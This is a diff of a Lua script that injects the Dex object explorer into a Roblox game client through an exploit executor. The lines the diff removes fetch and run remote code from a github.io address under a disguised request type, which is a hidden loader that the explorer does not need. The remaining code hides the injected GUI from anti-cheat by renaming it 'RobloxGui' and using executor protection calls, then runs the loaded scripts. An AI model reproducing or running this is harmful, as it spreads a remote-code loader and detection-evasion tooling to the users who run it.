@@ -4,34 +4,6 @@ local function NSIK_fake_script()
 
 getgenv().Services = setmetatable({},{__index=function(s,r) return game:service(r) end})	
 						
-getgenv().confi = loadstring(game:HttpGet("https://l8x.github.io/syndexpro/confi.lua", true, Enum.HttpRequestType.Analytics, true))
-			
-pcall(function()
-
-local OldIndex
-OldIndex = hookmetamethod(game, "__index", function(Self, Index)
-    return OldIndex(Self, Index)
-end)
-
-local OldNewIndex
-OldNewIndex = hookmetamethod(game, "__newindex", function(Self, Index, Value)
-    return OldNewIndex(Self, Index, Value)
-end)
-
-local OldNamecall
-OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
-    return OldNamecall(Self, ...)
-end)
-
-local mt = getrawmetatable(game)
-
-local old
-old = hookfunction(mt.__namecall, function(...)
-   return old(...)
-end)
-
-end)
-
 local cloneref = cloneref or function(ref)
 return ref
 end
@@ -41,7 +13,6 @@ local CContentProvider = cloneref(Services.ContentProvider)
 local CInsertService = cloneref(Services.InsertService)
 
 -- < Functions > --
-getgenv().yeetdex = function(yeetdex)
 
 local CoreGui = CCoreGui
 local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
@@ -99,39 +70,34 @@ local ScriptContext = cloneref(Services.ScriptContext)
 local RandomObject = CoreGui:FindFirstChildOfClass("ScreenGui")
 local RandomObject2 = Instance.new("Folder", RandomObject)
 
-pcall(function() syn.protect_gui(RandomObject2) end)
+pcall(function() 
+if syn and syn.protect_gui then
+syn.protect_gui(RandomObject2)
+end
+end)
 
 local CRandomObject2 = cloneref(RandomObject2)
 
-pcall(function() syn.protect_gui(CRandomObject2) end)
-
+pcall(function() 
+if syn and syn.protect_gui then
+syn.protect_gui(CRandomObject2)
+end
+end)
+	
 local Dex = cloneref(getobjects("rbxassetid://7995973532")[1])
 ContentProvider:Preload("rbxassetid://7995973532")
+
+pcall(function()
 task.spawn(function()
 for i,v in pairs(Dex:GetDescendants()) do
-    syn.protect_gui(v)
+    pcall(function() syn.protect_gui(v) end)
     end
-    task.wait(0)
 end)
+end)
+
 Dex.Name = "RobloxGui" -- bypass attempt??
 
-pcall(function()
-sethiddenproperty(Dex, "AutoLocalize", true)
-sethiddenproperty(Dex, "Localize", true)
-sethiddenproperty(Dex, "IgnoreGuiInset", true)
-sethiddenproperty(Dex, "DisplayOrder", 2147483647)
-sethiddenproperty(cloneref(Services.UserInputService), "GazeSelectionEnabled", true)
-sethiddenproperty(cloneref(Services.StarterGui), "ProcessUserInput", true)
-end)
-
-pcall(function()
-syn.protect_gui(Dex)
-syn.protect_gui(RandomObject)
-syn.protect_gui(RandomObject2)
-syn.protect_gui(CRandomObject2)
-end)
-
-Dex.Parent = gethiddengui() or gethui() or CRandomObject2
+Dex.Parent = gethiddengui and gethiddengui() or gethui and gethui() or CRandomObject2
 
 local function Load(Obj, Url)
 	local function GiveOwnGlobals(Func, Script)
@@ -152,7 +118,7 @@ local function Load(Obj, Url)
 	end
 	local function LoadScripts(_, Script)
 		if Script:IsA("LocalScript") then
-			spawn(function()
+			task.spawn(function()
 				GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
 			end)
 		end
@@ -163,5 +129,3 @@ end
 Load(Dex)
 end
 coroutine.wrap(NSIK_fake_script)()
-
-pcall(function() confi() end)
